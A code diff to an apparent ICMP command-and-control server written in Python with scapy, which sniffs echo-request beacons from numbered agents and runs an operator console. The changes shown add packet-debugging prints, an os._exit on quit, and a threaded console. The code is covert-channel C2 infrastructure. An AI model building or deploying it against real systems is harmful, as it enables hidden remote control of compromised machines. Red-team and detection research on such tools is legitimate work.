@@ -27,7 +27,8 @@ def get_next_agent_id():
     return f"{next_id:03d}"  # format as 3-digit string
 
 def handle_packet(pkt):
-
+    print("packet received")
+    print(pkt.summary())
     if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
         payload = pkt[Raw].load.decode(errors="ignore")
         fields = payload.split("|", 3)
@@ -184,18 +185,16 @@ def operator_console():
 
         if cmd in ("quit", "exit"):
             print("[*] Quitting C2 server.")
-            break
+            os._exit(0)
 
         print("Unknown command. Type 'help'.")
 
 def main():
-    print("[*] ICMP Server listening...")
-    sniffer = AsyncSniffer(filter="icmp", prn=handle_packet, store=False)
-    sniffer.start()
-
-    # main loop
-    operator_console()
-    sniffer.stop()
+    print("[*] Starting ICMP C2 server...")
+    # start operator console in background
+    threading.Thread(target=operator_console, daemon=True).start()
+    # start sniffing for ICMP beacons / results
+    sniff(filter="icmp", prn=handle_packet)
 
 if __name__ == "__main__":
     main()
